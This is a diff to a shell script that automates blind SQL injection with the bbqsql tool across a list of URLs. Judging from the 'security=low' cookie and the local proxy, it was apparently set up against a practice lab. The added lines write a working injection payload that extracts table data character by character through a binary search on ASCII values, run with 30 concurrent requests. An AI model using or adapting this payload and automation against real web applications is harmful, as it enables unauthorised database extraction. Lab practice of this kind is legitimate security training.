@@ -16,6 +16,14 @@ for url in $urllist; do
     echo -n "method = POST\n" >> bbqsql.conf
     echo -n 'cookies = "security=low;PHPSESSID='$session_id'"\n' >> bbqsql.conf
     echo -n 'proxies = {"http": "127.0.0.1:8080","https": "127.0.0.1:8080"}\n' >> bbqsql.conf
+
+    echo -n "\n" >> bbqsql.conf
+    echo -n "[HTTP Config]\n" >> bbqsql.conf
+    echo -n 'query = " and ASCII(SUBSTR((SELECT data FROM data LIMIT 1 OFFSET ${row_index:1}),${char_index:1},1))${comparator:>}${char_val:0} "\n' >> bbqsql.conf
+    echo -n "technique = binary_search\n" >> bbqsql.conf
+    echo -n "comparison_attr = size\n" >> bbqsql.conf
+    echo -n "concurrency = 30\n" >> bbqsql.conf
+
     bbqsql -c bbqsql.conf
 
 done
